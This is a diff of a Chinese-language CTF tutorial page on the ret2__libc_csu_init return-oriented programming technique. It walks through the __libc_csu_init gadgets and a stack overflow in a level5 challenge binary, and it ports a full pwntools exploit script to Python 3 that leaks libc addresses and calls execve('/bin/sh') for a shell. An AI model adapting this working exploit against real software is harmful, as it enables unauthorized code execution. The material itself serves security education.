@@ -40,11 +40,11 @@
 <span class=nl>.text:</span><span class=err>0000000000400622</span><span class=w>                 </span><span class=nf>pop</span><span class=w>     </span><span class=no>r15</span>
 <span class=nl>.text:</span><span class=err>0000000000400624</span><span class=w>                 </span><span class=nf>retn</span>
 <span class=nl>.text:</span><span class=err>0000000000400624</span><span class=w> </span><span class=nf>__libc_csu_init</span><span class=w> </span><span class=no>endp</span>
-</code></pre></div> <p>这里我们可以利用以下几点</p> <ul> <li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li> <li>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx,将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li> <li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。</li> </ul> <h3 id=_2>示例<a class=headerlink href=#_2 title="Permanent link">&para;</a></h3> <p>这里我们以蒸米的一步一步学 ROP 之 linux_x64 篇中 <a href=https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5>level5</a> 为例进行介绍。首先检查程序的安全保护</p> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>ret2__libc_csu_init<span class=w> </span>git:<span class=o>(</span>iromise<span class=o>)</span><span class=w> </span>✗<span class=w> </span>checksec<span class=w> </span>level5
+</code></pre></div> <p>这里我们可以利用以下几点</p> <ul> <li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li> <li>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx,将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li> <li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。</li> </ul> <h3 id=_2>示例<a class=headerlink href=#_2 title="Permanent link">&para;</a></h3> <p>这里我们以hitcon <a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/ret2__libc_csu_init/hitcon-level5>level5</a> 为例进行介绍。首先检查程序的安全保护</p> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>ret2__libc_csu_init<span class=w> </span>git:<span class=o>(</span>iromise<span class=o>)</span><span class=w> </span>✗<span class=w> </span>checksec<span class=w> </span>level5<span class=w>    </span>
 <span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
 <span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
 <span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
-<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
+<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabledd
 <span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
 </code></pre></div> <p>程序为 64 位，开启了堆栈不可执行保护。</p> <p>其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出</p> <div class=highlight><pre><span></span><code><span class=kt>ssize_t</span><span class=w> </span><span class=nf>vulnerable_function</span><span class=p>()</span>
 <span class=p>{</span>
@@ -53,10 +53,8 @@
 <span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=mh>0x200uLL</span><span class=p>);</span>
 <span class=p>}</span>
 </code></pre></div> <p>简单浏览下程序，发现程序中既没有 system 函数地址，也没有 /bin/sh 字符串，所以两者都需要我们自己去构造了。</p> <p><strong>注：这里我尝试在我本机使用 system 函数来获取 shell 失败了，应该是环境变量的问题，所以这里使用的是execve 来获取 shell。</strong></p> <p>基本利用思路如下</p> <ul> <li>利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数</li> <li>根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</li> <li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 '/bin/sh’ 地址，并使得程序重新执行main 函数。</li> <li>再次利用栈溢出执行 libc_csu_gadgets 执行 execve('/bin/sh') 获取 shell。</li> </ul> <p>exp 如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
-<span class=kn>from</span><span class=w> </span><span class=nn>LibcSearcher</span><span class=w> </span><span class=kn>import</span> <span class=n>LibcSearcher</span>
 
-<span class=c1>#context.log_level = &#39;debug&#39;</span>
-
+<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class=p>)</span>  
 <span class=n>level5</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./level5&#39;</span><span class=p>)</span>
 <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./level5&#39;</span><span class=p>)</span>
 
@@ -66,8 +64,7 @@
 <span class=n>bss_base</span> <span class=o>=</span> <span class=n>level5</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
 <span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x0000000000400600</span>
 <span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x000000000040061A</span>
-<span class=n>fakeebp</span> <span class=o>=</span> <span class=s1>&#39;b&#39;</span> <span class=o>*</span> <span class=mi>8</span>
-
+<span class=n>fakeebp</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span> <span class=o>*</span> <span class=mi>8</span>
 
 <span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>,</span> <span class=n>last</span><span class=p>):</span>
     <span class=c1># pop rbx,rbp,r12,r13,r14,r15</span>
@@ -77,36 +74,32 @@
     <span class=c1># rdi=edi=r15d</span>
     <span class=c1># rsi=r14</span>
     <span class=c1># rdx=r13</span>
-    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x80</span> <span class=o>+</span> <span class=n>fakeebp</span>
+    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x80</span> <span class=o>+</span> <span class=n>fakeebp</span>
     <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span>
         <span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
     <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
-    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
+    <span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
     <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>last</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
-    <span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
 
-
-<span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Hello, World</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
-<span class=c1>## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span>
-<span class=c1>## write(1,write_got,8)</span>
+<span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Hello, World</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
 <span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>write_got</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=n>write_got</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>main_addr</span><span class=p>)</span>
 
 <span class=n>write_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
-<span class=n>libc</span> <span class=o>=</span> <span class=n>LibcSearcher</span><span class=p>(</span><span class=s1>&#39;write&#39;</span><span class=p>,</span> <span class=n>write_addr</span><span class=p>)</span>
-<span class=n>libc_base</span> <span class=o>=</span> <span class=n>write_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s1>&#39;write&#39;</span><span class=p>)</span>
-<span class=n>execve_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s1>&#39;execve&#39;</span><span class=p>)</span>
-<span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;execve_addr &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>execve_addr</span><span class=p>))</span>
-<span class=c1>##gdb.attach(sh)</span>
+<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;Leaked write address: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>write_addr</span><span class=p>)</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>)</span>
 
-<span class=c1>## read(0,bss_base,16)</span>
-<span class=c1>## read execve_addr and /bin/sh\x00</span>
-<span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Hello, World</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+<span class=n>libc_base</span> <span class=o>=</span> <span class=n>write_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
+<span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;Libc base address: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>)</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>)</span>
+
+<span class=n>execve_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;execve&#39;</span><span class=p>]</span>
+<span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;Execve address: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>execve_addr</span><span class=p>)</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>)</span>
+
+<span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Hello, World</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
 <span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>read_got</span><span class=p>,</span> <span class=mi>16</span><span class=p>,</span> <span class=n>bss_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>main_addr</span><span class=p>)</span>
-<span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>execve_addr</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
+<span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>execve_addr</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
 
-<span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Hello, World</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
-<span class=c1>## execve(bss_base+8)</span>
+<span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Hello, World</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
 <span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>bss_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>bss_base</span> <span class=o>+</span> <span class=mi>8</span><span class=p>,</span> <span class=n>main_addr</span><span class=p>)</span>
 <span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
 </code></pre></div> <h3 id=_3>思考<a class=headerlink href=#_3 title="Permanent link">&para;</a></h3> <h4 id=_4>改进<a class=headerlink href=#_4 title="Permanent link">&para;</a></h4> <p>在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法</p> <h5 id=1-rbx-rbp>改进1 - 提前控制 rbx 与 rbp<a class=headerlink href=#1-rbx-rbp title="Permanent link">&para;</a></h5> <p>可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要112。</p> <h5 id=2->改进2-多次利用<a class=headerlink href=#2- title="Permanent link">&para;</a></h5> <p>其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件</p> <ul> <li>漏洞可以被多次触发</li> <li>在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。</li> </ul> <p><strong>当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。</strong></p> <h4 id=gadget>gadget<a class=headerlink href=#gadget title="Permanent link">&para;</a></h4> <p>其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数</p> <div class=highlight><pre><span></span><code>_init
